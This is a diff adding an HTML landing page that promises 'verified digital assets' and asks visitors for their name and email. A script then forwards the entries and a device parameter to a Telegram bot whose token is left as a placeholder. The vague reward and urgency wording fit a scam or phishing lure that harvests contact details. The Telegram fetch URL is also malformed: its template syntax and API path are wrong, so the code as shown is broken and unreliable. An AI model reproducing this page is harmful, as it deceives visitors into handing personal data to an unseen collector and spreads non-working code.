@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body, html {
+            height: 100%;
+            background-color: #0a0a0c;
+            color: #ffffff;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bg-glow {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.15) 0%, rgba(0,0,0,0) 70%);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .card-container {
+            position: relative;
+            z-index: 2;
+            width: 90%;
+            max-width: 440px;
+            background: rgba(18, 18, 24, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            line-height: 1.3;
+            letter-spacing: -0.02em;
+            margin-bottom: 12px;
+        }
+
+        p {
+            font-size: 15px;
+            color: #94a3b8;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            text-align: left;
+        }
+
+        .input-field {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 15px;
+            color: #ffffff;
+            width: 100%;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.02);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
+        }
+
+        .submit-btn {
+            background: #6366f1;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+            margin-top: 8px;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
+        }
+
+        .submit-btn:hover {
+            background: #4f46e5;
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="card-container">
+        <h1>Secure Your Access Pass</h1>
+        <p>Enter your details below to instantly view your verified digital assets.</p>
+        
+        <form id="signupForm" onsubmit="sendData(event)">
+            <div class="form-group">
+                <input type="text" id="userName" class="input-field" placeholder="First Name" required>
+                <input type="email" id="userEmail" class="input-field" placeholder="Email Address" required>
+                <button type="submit" class="submit-btn">Unlock Access Now</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Get the device answer from the first page URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceSelected = urlParams.get('device') || 'Not Specified';
+
+        function sendData(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('userName').value;
+            const email = document.getElementById('userEmail').value;
+
+            // CHANGE THESE TWO LINES BELOW WITH YOUR TELEGRAM NUMBERS
+            const telegramToken = 'YOUR_TELEGRAM_TOKEN_HERE';
+            const chatID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
+
+            const message = `🔔 NEW SIGNUP!\n\n👤 Name: ${name}\n📧 Email: ${email}\n💻 Device: ${deviceSelected}`;
+
+            // Send to Telegram instantly
+            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatID, text: message })
+            })
+            .then(() => {
+                // Once sent, go to the questions page smoothly
+                window.location.href = '/questions';
+            })
+            .catch(() => {
+                // Fallback to move forward even if connection glitches
+                window.location.href = '/questions';
+            });
+        }
+    </script>
+</body>
+</html>
